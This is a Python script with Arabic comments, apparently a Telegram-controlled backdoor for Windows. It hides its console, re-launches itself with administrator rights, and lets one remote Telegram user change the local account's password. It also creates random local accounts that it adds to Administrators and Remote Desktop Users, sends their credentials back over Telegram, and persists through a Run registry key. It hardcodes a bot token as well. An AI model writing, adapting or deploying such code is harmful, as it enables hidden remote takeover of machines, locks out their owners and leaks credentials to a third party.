import subprocess
import sys
import os
import winreg
import ctypes
import random
import string
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ============ إعدادات البوت ============
BOT_TOKEN = "8764156627:AAHefmZFgIUuABE_F1R4Kuo5IQoY1U_XeVk"  # توكن البوت
ALLOWED_USERS = [6204174519]  # معرف المستخدم المسموح له فقط

# ============ الحصول على اسم المستخدم الحالي ============
def get_current_username():
    """الحصول على اسم المستخدم الذي يقوم بتشغيل السكريبت"""
    try:
        username = os.environ.get('USERNAME')
        if username:
            return username
        
        result = subprocess.run('whoami', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            username = result.stdout.strip().split('\\')[-1]
            return username
    except:
        pass
    
    return None

# ============ دوال إنشاء مستخدم جديد ============
def generate_random_username():
    """إنشاء اسم مستخدم عشوائي"""
    prefixes = ['User', 'RDP', 'Admin', 'Guest', 'Temp', 'New', 'Acc']
    suffix = ''.join(random.choices(string.digits, k=4))
    username = f"{random.choice(prefixes)}{suffix}"
    return username

def generate_random_password():
    """إنشاء كلمة مرور عشوائية قوية"""
    # حروف كبيرة
    uppercase = random.choices(string.ascii_uppercase, k=2)
    # حروف صغيرة
    lowercase = random.choices(string.ascii_lowercase, k=4)
    # أرقام
    digits = random.choices(string.digits, k=3)
    # رموز خاصة
    symbols = random.choices('!@#$%&*', k=2)
    
    # خلط الأحرف
    all_chars = uppercase + lowercase + digits + symbols
    random.shuffle(all_chars)
    password = ''.join(all_chars)
    
    return password

def create_new_user(username, password):
    """إنشاء مستخدم جديد مع صلاحيات RDP"""
    results = []
    success = True
    
    # إنشاء المستخدم
    cmd_create = f"net user {username} {password} /add"
    result_create = subprocess.run(cmd_create, shell=True, capture_output=True, text=True)
    
    if result_create.returncode == 0:
        results.append(f"✅ تم إنشاء المستخدم: {username}")
        
        # إضافة المستخدم لمجموعة Administrators
        cmd_admin = f"net localgroup Administrators {username} /add"
        result_admin = subprocess.run(cmd_admin, shell=True, capture_output=True, text=True)
        
        if result_admin.returncode == 0:
            results.append(f"✅ تم إضافة {username} إلى مجموعة Administrators")
        else:
            results.append(f"⚠️ فشل إضافة {username} إلى Administrators: {result_admin.stderr}")
            success = False
        
        # إضافة المستخدم لمجموعة Remote Desktop Users
        cmd_rdp = f"net localgroup \"Remote Desktop Users\" {username} /add"
        result_rdp = subprocess.run(cmd_rdp, shell=True, capture_output=True, text=True)
        
        if result_rdp.returncode == 0:
            results.append(f"✅ تم إضافة {username} إلى مجموعة Remote Desktop Users")
        else:
            results.append(f"⚠️ فشل إضافة {username} إلى Remote Desktop Users: {result_rdp.stderr}")
            success = False
        
    else:
        results.append(f"❌ فشل إنشاء المستخدم: {result_create.stderr}")
        success = False
    
    return success, results, username, password

def delete_user(username):
    """حذف مستخدم (اختياري)"""
    cmd = f"net user {username} /delete"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode == 0

def check_user_exists(username):
    """التحقق من وجود مستخدم"""
    cmd = f"net user {username}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode == 0

# ============ دوال النظام ============
def run_as_admin():
    """يعيد تشغيل السكريبت بصلاحيات Administrator"""
    try:
        if os.name == 'nt':
            if ctypes.windll.shell32.IsUserAnAdmin():
                return True
            
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
    except Exception as e:
        print(f"فشل رفع الصلاحيات: {e}")
        return False

def hide_console():
    """إخفاء نافذة الكونسول"""
    if os.name == 'nt':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def change_current_user_password(new_password):
    """تغيير كلمة مرور المستخدم الحالي فقط"""
    current_user = get_current_username()
    
    if not current_user:
        return False, "❌ لم يتم العثور على اسم المستخدم الحالي"
    
    command = f"net user {current_user} {new_password}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        return True, f"✅ تم تغيير كلمة المرور للمستخدم {current_user}"
    else:
        return False, f"❌ فشل تغيير كلمة المرور: {result.stderr}"

def get_current_user_info():
    """الحصول على معلومات المستخدم الحالي"""
    current_user = get_current_username()
    if not current_user:
        return None
    
    result = subprocess.run(f'net user {current_user}', shell=True, capture_output=True, text=True)
    
    info = {
        'username': current_user,
        'full_info': result.stdout if result.returncode == 0 else "لا توجد معلومات"
    }
    
    return info

def add_to_startup():
    """إضافة السكريبت إلى بدء التشغيل"""
    try:
        script_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RDP_Password_Changer_Bot", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
        return True
    except:
        return False

def remove_from_startup():
    """إزالة السكريبت من بدء التشغيل"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "RDP_Password_Changer_Bot")
        winreg.CloseKey(key)
        return True
    except:
        return False

# ============ دوال البوت ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب والقائمة الرئيسية"""
    user_id = update.effective_user.id
    
    # التحقق من الصلاحيات
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("⛔ غير مصرح لك باستخدام هذا البوت")
        return
    
    # الحصول على المستخدم الحالي
    current_user = get_current_username()
    
    keyboard = [
        [InlineKeyboardButton("🔐 تغيير كلمة مروري", callback_data='change_my_password')],
        [InlineKeyboardButton("👤 إنشاء مستخدم جديد", callback_data='create_new_user')],
        [InlineKeyboardButton("ℹ️ معلومات حسابي", callback_data='my_info')],
        [InlineKeyboardButton("⚙️ الإعدادات", callback_data='settings')],
        [InlineKeyboardButton("ℹ️ معلومات النظام", callback_data='system_info')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "🤖 *بوت إدارة مستخدمي RDP*\n\n"
        f"👤 *المستخدم الحالي:* `{current_user}`\n\n"
        "الخدمات المتاحة:\n"
        "• تغيير كلمة مرور المستخدم الحالي\n"
        "• إنشاء مستخدم جديد مع صلاحيات RDP\n"
        "• عرض معلومات الحساب والنظام\n\n"
        "اختر أحد الخيارات التالية:"
    )
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض القائمة الرئيسية (للاستخدام مع أزرار الرجوع)"""
    query = update.callback_query
    current_user = get_current_username()
    
    keyboard = [
        [InlineKeyboardButton("🔐 تغيير كلمة مروري", callback_data='change_my_password')],
        [InlineKeyboardButton("👤 إنشاء مستخدم جديد", callback_data='create_new_user')],
        [InlineKeyboardButton("ℹ️ معلومات حسابي", callback_data='my_info')],
        [InlineKeyboardButton("⚙️ الإعدادات", callback_data='settings')],
        [InlineKeyboardButton("ℹ️ معلومات النظام", callback_data='system_info')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "🤖 *بوت إدارة مستخدمي RDP*\n\n"
        f"👤 *المستخدم الحالي:* `{current_user}`\n\n"
        "الخدمات المتاحة:\n"
        "• تغيير كلمة مرور المستخدم الحالي\n"
        "• إنشاء مستخدم جديد مع صلاحيات RDP\n"
        "• عرض معلومات الحساب والنظام\n\n"
        "اختر أحد الخيارات التالية:"
    )
    
    await query.edit_message_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أزرار القائمة"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await query.edit_message_text("⛔ غير مصرح لك باستخدام هذا البوت")
        return
    
    # تغيير كلمة المرور
    if query.data == 'change_my_password':
        context.user_data['waiting_for_password'] = True
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        current_user = get_current_username()
        await query.edit_message_text(
            f"🔐 *تغيير كلمة المرور للمستخدم {current_user}*\n\n"
            f"أرسل كلمة المرور الجديدة:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # إنشاء مستخدم جديد
    elif query.data == 'create_new_user':
        # إنشاء اسم مستخدم وكلمة مرور عشوائية
        username = generate_random_username()
        password = generate_random_password()
        
        # محاولة إنشاء المستخدم
        success, results, created_user, created_pass = create_new_user(username, password)
        
        # بناء رسالة الرد
        if success:
            response = (
                "✅ *تم إنشاء مستخدم RDP بنجاح!*\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 *اسم المستخدم:* `{created_user}`\n"
                f"🔑 *كلمة المرور:* `{created_pass}`\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "*معلومات الصلاحيات:*\n"
                "✅ عضو في مجموعة Administrators\n"
                "✅ عضو في مجموعة Remote Desktop Users\n\n"
                "*معلومات الاتصال:*\n"
                f"💻 يمكنك الاتصال عبر RDP باستخدام:\n"
                f"   المستخدم: `{created_user}`\n"
                f"   كلمة المرور: `{created_pass}`\n\n"
                "⚠️ *تنبيه:* هذه المعلومات لن تظهر مرة أخرى!\n"
                "   يرجى حفظها في مكان آمن."
            )
        else:
            response = "❌ *فشل إنشاء المستخدم*\n\n"
            for msg in results:
                response += f"• {msg}\n"
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            response,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # معلومات حسابي
    elif query.data == 'my_info':
        info = get_current_user_info()
        if info:
            keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                f"ℹ️ *معلومات المستخدم الحالي*\n\n"
                f"👤 *الاسم:* `{info['username']}`\n"
                f"🖥️ *الجهاز:* `{os.environ.get('COMPUTERNAME', 'Unknown')}`\n\n"
                f"📋 *معلومات إضافية:*\n```\n{info['full_info'][:500]}\n```",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ لا يمكن الحصول على معلومات المستخدم",
                reply_markup=reply_markup
            )
    
    # الإعدادات
    elif query.data == 'settings':
        keyboard = [
            [InlineKeyboardButton("🔄 إضافة لبدء التشغيل", callback_data='add_startup')],
            [InlineKeyboardButton("🗑️ إزالة من بدء التشغيل", callback_data='remove_startup')],
            [InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "⚙️ *الإعدادات*\n\nاختر الإعداد الذي تريد تعديله:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # معلومات النظام
    elif query.data == 'system_info':
        hostname = os.environ.get('COMPUTERNAME', 'Unknown')
        username = get_current_username()
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"ℹ️ *معلومات النظام*\n\n"
            f"🖥️ الجهاز: `{hostname}`\n"
            f"👤 المستخدم الحالي: `{username}`\n"
            f"🐍 Python: `{sys.version.split()[0]}`\n"
            f"🔄 آخر تشغيل: تم بنجاح",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # إضافة لبدء التشغيل
    elif query.data == 'add_startup':
        if add_to_startup():
            keyboard = [[InlineKeyboardButton("🔙 رجوع للإعدادات", callback_data='settings')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "✅ تم إضافة البوت إلى بدء التشغيل التلقائي",
                reply_markup=reply_markup
            )
        else:
            keyboard = [[InlineKeyboardButton("🔙 رجوع للإعدادات", callback_data='settings')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ فشل إضافة البوت لبدء التشغيل",
                reply_markup=reply_markup
            )
    
    # إزالة من بدء التشغيل
    elif query.data == 'remove_startup':
        if remove_from_startup():
            keyboard = [[InlineKeyboardButton("🔙 رجوع للإعدادات", callback_data='settings')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "✅ تم إزالة البوت من بدء التشغيل التلقائي",
                reply_markup=reply_markup
            )
        else:
            keyboard = [[InlineKeyboardButton("🔙 رجوع للإعدادات", callback_data='settings')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ البوت غير موجود في بدء التشغيل",
                reply_markup=reply_markup
            )
    
    # الرجوع للقائمة الرئيسية
    elif query.data == 'back_main':
        await show_main_menu(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الرسائل النصية (كلمة المرور الجديدة)"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("⛔ غير مصرح لك باستخدام هذا البوت")
        return
    
    text = update.message.text.strip()
    
    # انتظار كلمة المرور الجديدة
    if context.user_data.get('waiting_for_password'):
        new_password = text
        
        if new_password:
            # تغيير كلمة المرور للمستخدم الحالي
            success, msg = change_current_user_password(new_password)
            
            # إضافة زر الرجوع
            keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(msg, reply_markup=reply_markup)
            
            # تنظيف البيانات
            context.user_data.pop('waiting_for_password', None)
        else:
            await update.message.reply_text("❌ الرجاء إدخال كلمة مرور صالحة")
    
    else:
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "استخدم الأزرار للتحكم بالبوت",
            reply_markup=reply_markup
        )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """إلغاء العملية الحالية"""
    context.user_data.clear()
    keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data='back_main')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "✅ تم إلغاء العملية الحالية",
        reply_markup=reply_markup
    )

def main():
    """تشغيل البوت"""
    hide_console()
    run_as_admin()
    
    # التحقق من وجود مستخدم حالي
    current_user = get_current_username()
    if not current_user:
        print("❌ لا يمكن تحديد المستخدم الحالي")
        sys.exit(1)
    
    print(f"👤 المستخدم الحالي: {current_user}")
    print(f"🚀 البوت يعمل...")
    
    # تشغيل البوت
    app = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print(f"✅ التوكن: {BOT_TOKEN[:15]}...")
    print(f"✅ المستخدم المسموح في تيليجرام: {ALLOWED_USERS[0]}")
    print(f"✅ سيتم تغيير كلمة المرور للمستخدم: {current_user}")
    print(f"✅ لن يتم إنشاء أي ملفات على الجهاز")
    
    app.run_polling()
input("اضغط Enter للخروج...")